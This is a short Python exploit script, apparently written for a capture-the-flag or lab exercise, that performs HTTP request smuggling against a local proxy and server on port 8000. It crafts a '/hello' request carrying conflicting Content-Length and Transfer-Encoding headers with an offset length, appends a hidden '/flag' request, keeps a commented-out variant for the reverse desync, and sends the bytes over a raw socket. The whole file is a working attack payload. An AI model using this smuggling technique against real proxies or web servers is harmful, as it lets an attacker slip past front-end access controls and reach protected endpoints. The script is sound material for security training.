#!/usr/bin/env python3
import socket
from request_builder import Request_Builder

HOST = '0.0.0.0'
PORT = 8000

# Proxy: chunked-encoding; Server: content-length 
# Proxy: TOTAL_MATCH_CHUNKED = False
# Server: TOTAL_MATCH_CHUNKED = True
# flag_request_builder = Request_Builder()
# flag_request_builder.url = "/flag"
# flag_request_builder.host = "{}:{}".format(HOST, PORT)
# flag_request = flag_request_builder.build()

# hello_request_builder = Request_Builder()
# hello_request_builder.url = "/hello"
# hello_request_builder.host = "{}:{}".format(HOST, PORT)
# hello_request_builder.add_content_length_header = True
# hello_request_builder.content_length_offset = - len(flag_request) + 2
# hello_request_builder.add_chunked_encoding_header = True
# hello_request_builder.add_chunked_encoding_header_value = "asd"
# hello_request_builder.add_chunked_encoding_body = True
# hello_request_builder.body = flag_request
# hello_request = hello_request_builder.build()

# msg = hello_request

# Proxy: content-length; Server: chunked-encoding
# Proxy: TOTAL_MATCH_CHUNKED = True
# Server: TOTAL_MATCH_CHUNKED = False
flag_request_builder = Request_Builder()
flag_request_builder.url = "/flag"
flag_request_builder.host = "{}:{}".format(HOST, PORT)
flag_request = flag_request_builder.build()

hello_request_builder = Request_Builder()
hello_request_builder.url = "/hello"
hello_request_builder.host = "{}:{}".format(HOST, PORT)
hello_request_builder.add_content_length_header = True
hello_request_builder.content_length_offset = len(flag_request) + 3
hello_request_builder.add_chunked_encoding_header = True
hello_request_builder.add_chunked_encoding_header_value = "asd"
hello_request_builder.add_chunked_encoding_body = True
hello_request = hello_request_builder.build()

msg = hello_request + flag_request

print("SEND:")
print(msg)
print("RAW:")
print(msg.encode("ascii"))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(5)
    s.connect((HOST, PORT))
    for c in msg:
        s.send(c.encode("ascii"))
    
    response = ""
    try:
        while True:
            response += s.recv(1).decode("ascii")
    except socket.timeout: pass
    print("RECEIVED:")
    print(response)